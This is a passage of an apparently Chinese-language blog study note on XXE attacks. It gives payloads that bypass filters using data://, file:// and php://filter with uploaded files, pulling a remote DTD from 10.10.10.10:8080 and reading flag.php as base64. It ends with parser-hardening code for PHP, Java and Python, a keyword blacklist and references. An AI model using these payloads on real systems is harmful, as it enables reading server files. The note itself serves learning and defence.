+&lt;test&gt;&amp;b;&lt;/test&gt;
+</code></pre>
+<h3 id="data-x2F-x2F-协议绕过"><a href="#data-x2F-x2F-协议绕过" class="headerlink" title="data:&#x2F;&#x2F;协议绕过"></a>data:&#x2F;&#x2F;协议绕过</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % a &quot; &lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt; &quot;&gt;
+%a;
+%b;
+]&gt;
+&lt;test&gt;&amp;b;&lt;/test&gt;
+&lt;!--编码内容--&gt;
+&lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt;
+</code></pre>
+<h3 id="file-x2F-x2F-协议加文件上传"><a href="#file-x2F-x2F-协议加文件上传" class="headerlink" title="file:&#x2F;&#x2F;协议加文件上传"></a>file:&#x2F;&#x2F;协议加文件上传</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % a SYSTEM
+&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
+%a;
+]&gt;
+&lt;!--上传文件--&gt;
+&lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt;
+</code></pre>
+<h3 id="php-x2F-x2F-filter协议加文件上传"><a href="#php-x2F-x2F-filter协议加文件上传" class="headerlink" title="php:&#x2F;&#x2F;filter协议加文件上传"></a>php:&#x2F;&#x2F;filter协议加文件上传</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % a SYSTEM
+&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
+%a;
+]&gt;
+&lt;test&gt;
+&amp;hack;
+&lt;/test&gt;
+&lt;!--上传文件--&gt;
+&lt;!ENTITY hack SYSTEM &#39;php://filter/read=convert.base64-
+encode/resource=./flag.php&#39;&gt;
+</code></pre>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-
+decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
+%a;
+]&gt;
+&lt;test&gt;
+&amp;hack;
+&lt;/test&gt;
+&lt;!--上传文件--&gt;
+(&lt;!ENTITY hack SYSTEM &#39;php://filter/read=convert.base64-
+encode/resource=./flag.php&#39;&gt;的base64加密)
+PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2Rl
+L3Jlc291cmNlPS4vZmxhZy5waHAnPg==
+</code></pre>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="使用语言提供的禁用外部实体方法"><a href="#使用语言提供的禁用外部实体方法" class="headerlink" title="使用语言提供的禁用外部实体方法"></a>使用语言提供的禁用外部实体方法</h3><p><strong>php</strong></p>
+<pre><code>libxml_disable_entity_loader(true);
+</code></pre>
+<p><strong>java</strong></p>
+<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+
+.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)
+
+.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
+</code></pre>
+<p><strong>python</strong></p>
+<pre><code>from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre>
+<h3 id="手动黑名单过滤"><a href="#手动黑名单过滤" class="headerlink" title="手动黑名单过滤"></a>手动黑名单过滤</h3><pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC
+</code></pre>
+<h3 id="专业防御"><a href="#专业防御" class="headerlink" title="专业防御"></a>专业防御</h3><p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leadroyal.cn/p/562/">https://www.leadroyal.cn/p/562/</a></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>学习</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-13">https://xz.aliyun.com/t/3357#toc-13</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a></p>
+
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 20xx - 2022 Hexo
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @John Doe
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
